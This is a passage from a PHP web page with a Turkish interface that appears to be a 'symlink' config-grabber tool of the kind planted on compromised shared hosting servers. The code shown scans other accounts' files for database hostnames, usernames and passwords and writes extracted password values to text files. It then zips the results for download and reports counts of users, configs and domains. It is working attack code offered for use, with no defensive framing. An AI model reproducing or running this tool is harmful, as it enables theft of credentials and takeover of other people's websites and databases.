                                if (preg_match_all('/mysql|mysqli|pgsql|sqlite|DB_HOST|DB_NAME|DB_USER|DB_PASS|password|username|hostname|database/i', $content, $matches)) {
                                    file_put_contents($target_name . '_sql.txt', "SQL Bulundu!\n" . implode("\n", array_unique($matches[0])));
                                }
                            }
                        }
                        
                        // Password bulucu
                        if (in_array('password_finder', $selected_tools)) {
                            $content = @file_get_contents($source_path);
                            if ($content) {
                                if (preg_match_all('/password\s*=\s*[\'"]?([^\'"]+)/i', $content, $matches)) {
                                    file_put_contents($target_name . '_pass.txt', "Passwords:\n" . implode("\n", $matches[1]));
                                }
                            }
                        }
                    }
                }
                
                $processed++;
            }
            
            // Tümünü ZIP'le
            if (in_array('zip_all', $selected_tools) && $found_configs > 0) {
                $zip_file = 'symlink_' . date('Ymd_His') . '.zip';
                $zip = new ZipArchive();
                if ($zip->open($zip_file, ZipArchive::CREATE) === true) {
                    $files = glob('*');
                    foreach ($files as $file) {
                        if (is_file($file)) {
                            $zip->addFile($file);
                        }
                    }
                    $zip->close();
                    echo "<div class='terminal'><div class='terminal-line'>✓ ZIP oluşturuldu: <a href='{$output_dir}/{$zip_file}'>{$zip_file}</a></div></div>";
                }
            }
            
            echo "</div>";
            
            // İstatistikleri güncelle
            echo "<script>
                document.getElementById('totalUsers').innerText = '{$total_users}';
                document.getElementById('totalConfigs').innerText = '{$found_configs}';
                document.getElementById('totalSize').innerText = '" . formatBytes($total_size) . "';
                document.getElementById('totalDomains').innerText = '" . count($detected_domains) . "';
            </script>";
            
            if ($found_configs > 0) {
                echo "<div class='toast' id='toast'>✅ İşlem tamamlandı! {$found_configs} config bulundu!</div>";
                echo "<script>setTimeout(() => document.getElementById('toast').remove(), 5000);</script>";
            }
        }
        
        // Yardımcı fonksiyon
        function formatBytes($bytes, $precision = 2) {
            $units = ['B', 'KB', 'MB', 'GB', 'TB'];
            $bytes = max($bytes, 0);
            $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
            $pow = min($pow, count($units) - 1);
            $bytes /= pow(1024, $pow);
            return round($bytes, $precision) . ' ' . $units[$pow];
        }
        ?>
    </div>

    <script>
        function showTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
            document.getElementById(tabName + '-tab').style.display = 'block';
            document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
            event.target.classList.add('active');
        }
        
        function clearAll() {
            if (confirm('Tüm seçimleri temizlemek istediğinize emin misiniz?')) {
                document.querySelectorAll('input[type="checkbox"]').forEach(el => el.checked = false);
                document.querySelector('textarea[name="passwd"]').value = '';
            }
        }
        
        function selectAll() {
            document.querySelectorAll('input[type="checkbox"]').forEach(el => el.checked = true);
        }
        
        function deselectAll() {
            document.querySelectorAll('input[type="checkbox"]').forEach(el => el.checked = false);
        }
        
        // Otomatik istatistik güncelleme
        setInterval(() => {
            const files = document.querySelectorAll('.file-card').length;
            document.getElementById('totalConfigs').innerText = files;
        }, 1000);
    </script>
</body>
</html>
